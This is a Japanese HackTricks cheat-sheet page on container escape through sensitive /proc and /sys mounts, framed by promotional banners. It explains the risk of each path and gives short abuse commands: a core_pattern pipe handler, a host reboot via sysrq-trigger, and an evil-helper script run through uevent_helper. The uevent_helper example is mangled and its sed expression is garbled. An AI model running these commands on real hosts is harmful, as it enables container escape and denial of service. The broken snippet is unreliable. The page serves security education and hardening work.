# 機密マウント

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を通じて<strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong>！</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**@carlospolopm**をフォローする
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

`/proc`および`/sys`の適切な名前空間分離なしでの公開は、攻撃面の拡大や情報漏洩など、重大なセキュリティリスクをもたらします。これらのディレクトリには機密ファイルが含まれており、誤って構成されたり、権限のないユーザーによってアクセスされたりすると、コンテナの脱出、ホストの変更、またはさらなる攻撃を助長する情報が提供される可能性があります。たとえば、`-v /proc:/host/proc`を誤ってマウントすると、パスベースの性質によりAppArmor保護がバイパスされ、`/host/proc`が保護されなくなります。

**各潜在的な脆弱性の詳細は** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**で見つけることができます。**

## procfsの脆弱性

### `/proc/sys`

このディレクトリは通常、`sysctl(2)`を介してカーネル変数を変更することを許可し、いくつかの懸念のあるサブディレクトリを含んでいます。

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)で説明されています。
- 最初の128バイトを引数として使用してコアファイル生成時に実行するプログラムを定義できます。ファイルがパイプ`|`で始まる場合、コードの実行につながる可能性があります。
- **テストおよび悪用例**：

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 書き込みアクセスをテスト
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # カスタムハンドラを設定
sleep 5 && ./crash & # ハンドラをトリガー
```

#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細に説明されています。
- カーネルモジュールローダーへのパスを含み、カーネルモジュールの読み込み時に呼び出されます。
- **アクセスの確認例**：

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobeへのアクセスを確認
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で言及されています。
- OOM条件が発生した場合にカーネルがパニックを起こすかOOMキラーを呼び出すかを制御するグローバルフラグです。

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)によると、ファイルシステムに関するオプションと情報が含まれています。
- 書き込みアクセスはホストに対するさまざまなサービス拒否攻撃を有効にする可能性があります。

#### **`/proc/sys/fs/binfmt_misc`**

- マジックナンバーに基づいて非ネイティブのバイナリ形式のインタプリタを登録することを可能にします。
- `/proc/sys/fs/binfmt_misc/register`が書き込み可能である場合、特権昇格やルートシェルアクセスにつながる可能性があります。
- 関連するエクスプロイトと説明：
- [binfmt\_miscを使用した貧乏人のルートキット](https://github.com/toffan/binfmt\_misc)
- 詳細なチュートリアル：[ビデオリンク](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc`のその他の項目

#### **`/proc/config.gz`**

- `CONFIG_IKCONFIG_PROC`が有効になっている場合、カーネル構成を公開する可能性があります。
- 実行中のカーネルの脆弱性を特定するために攻撃者に役立ちます。

#### **`/proc/sysrq-trigger`**

- Sysrqコマンドを呼び出すことを許可し、即座のシステム再起動やその他の重要なアクションを引き起こす可能性があります。
- **ホストの再起動例**：

```bash
echo b > /proc/sysrq-trigger # ホストを再起動
```

#### **`/proc/kmsg`**

- カーネルリングバッファメッセージを公開します。
- カーネルのエクスプロイト、アドレスリーク、および機密システム情報の提供に役立ちます。

#### **`/proc/kallsyms`**

- カーネルがエクスポートしたシンボルとそのアドレスをリストします。
- 特にKASLRを克服するためにカーネルエクスプロイトの開発に不可欠です。
- アドレス情報は、`kptr_restrict`が`1`または`2`に設定されている場合に制限されます。
- 詳細は[proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)にあります。

#### **`/proc/[pid]/mem`**

- カーネルメモリデバイス`/dev/mem`とやり取りします。
- 歴史的に特権昇格攻撃の脆弱性がありました。
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細に説明されています。

#### **`/proc/kcore`**

- ELFコア形式でシステムの物理メモリを表します。
- 読み取りによりホストシステムや他のコンテナのメモリ内容が漏洩する可能性があります。
- 大きなファイルサイズは読み取りの問題やソフトウェアのクラッシュを引き起こす可能性があります。
- 2019年の[Dumping /proc/kcore](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)での詳細な使用法。

#### **`/proc/kmem`**

- カーネル仮想メモリを表す`/dev/kmem`の代替インターフェースです。
- 読み取りと書き込みを許可し、したがってカーネルメモリの直接変更を可能にします。

#### **`/proc/mem`**

- 物理メモリを表す`/dev/mem`の代替インターフェースです。
- 読み取りと書き込みを許可し、すべてのメモリの変更には仮想から物理アドレスへの解決が必要です。

#### **`/proc/sched_debug`**

- PID名前空間の保護をバイパスしてプロセススケジューリング情報を返します。
- プロセス名、ID、およびcgroup識別子を公開します。

#### **`/proc/[pid]/mountinfo`**

- プロセスのマウント名前空間内のマウントポイントに関する情報を提供します。
- コンテナの`rootfs`またはイメージの場所を公開します。

### `/sys`の脆弱性

#### **`/sys/kernel/uevent_helper`**

- カーネルデバイス`uevents`を処理するために使用されます。
- `/sys/kernel/uevent_helper`に書き込むと、`uevent`トリガー時に任意のスクリプトが実行される可能性があります。
- **悪用の例**: %%%bash

#### ペイロードを作成

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### コンテナのOverlayFSマウントからホストパスを見つける

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### uevent\_helperを悪意のあるヘルパーに設定

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### ueventをトリガー

echo change > /sys/class/mem/null/uevent

#### 出力を読む

cat /output %%%
#### **`/sys/class/thermal`**

* 温度設定を制御し、DoS攻撃や物理的損傷を引き起こす可能性があります。

#### **`/sys/kernel/vmcoreinfo`**

* カーネルアドレスを漏洩し、KASLRを危険にさらす可能性があります。

#### **`/sys/kernel/security`**

* `securityfs` インターフェースを収容し、AppArmorのようなLinuxセキュリティモジュールの構成を可能にします。
* アクセス権限を持つことで、コンテナがMACシステムを無効にすることができるかもしれません。

#### **`/sys/firmware/efi/vars` および `/sys/firmware/efi/efivars`**

* NVRAM内のEFI変数とやり取りするためのインターフェースを公開します。
* 誤った構成や悪用により、ブリック化したノートパソコンや起動不能なホストマシンにつながる可能性があります。

#### **`/sys/kernel/debug`**

* `debugfs` はカーネルに対する「ルールのない」デバッグインターフェースを提供します。
* 制限のない性質からくるセキュリティ問題の歴史があります。

### 参考文献

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
